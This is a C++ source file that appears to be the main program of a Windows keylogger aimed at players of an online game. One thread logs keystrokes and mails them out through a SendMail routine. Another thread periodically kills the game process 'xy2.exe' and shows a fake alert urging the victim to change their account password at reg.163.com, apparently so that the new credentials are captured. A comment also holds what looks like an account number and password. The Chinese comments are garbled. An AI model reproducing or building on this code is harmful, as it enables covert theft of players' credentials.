// ready.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "MmjbpApp.h"
#include "Key_Memory.h"

DWORD WINAPI ThreadTaskKill (LPVOID pParam)//�����߳���ں���
{
	while(true)
	{
		static int a=0;
		if(0 == a)
		{
		   Sleep(60000);//1����֮����Ϸ�Զ�����   117896369    yeainiu01010123.   ����������		   
		   a++;
		   system("taskkill /f /im xy2.exe");//������
		   //system("taskkill /f /im my.exe");//�λ�����
		}
		else
		{
			Sleep(5*60000);
			a++;			
		    system("taskkill /f /im xy2.exe");//������
		    //system("taskkill /f /im my.exe");//�λ�����*/
			MessageBox(GetForegroundWindow(), 
			   "�����������ж�[0]\r\n��ʾ������������п���й©\r\n�뾡���½http://reg.163.com�޸�����������˺�","������", 0);
		}
	}
	return 0;
}

//5���¶���������  1.����ʱ�������Լ����� 2.�����ַ���� 3.�����ʼ���� 4.���渽���ļ�λ�� 5.���ڹؼ�������
DWORD WINAPI ThreadKeyMemory(LPVOID pParam)//��¼�߳���ں���
{
	string buffer("");
	Key_Memory key;
	CMmjbpApp MailtheApp;

	while(true)
	{
	    if(key.KeyLogger(buffer))//��ʼ��¼����
		{
    		MailtheApp.SendMail(buffer);//���ͼ�¼���� �� ͼƬ
			//MessageBox(GetForegroundWindow(), "�ʼ���������","������", 0);
			buffer = "";
		}
        Sleep(100);
	}
	return 0;
}




int WINAPI WinMain/*main*/(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpCmdLine,
    int nCmdShow
)
{	
	DWORD mpid = 3000;
	DWORD tpid = 3001;
	::CreateThread(NULL, NULL, ThreadKeyMemory, NULL, 0, &mpid);
	::CreateThread(NULL, NULL, ThreadTaskKill, NULL, 0, &tpid);
	while(true)
	{
		Sleep(300);
	}
	return 0;
}


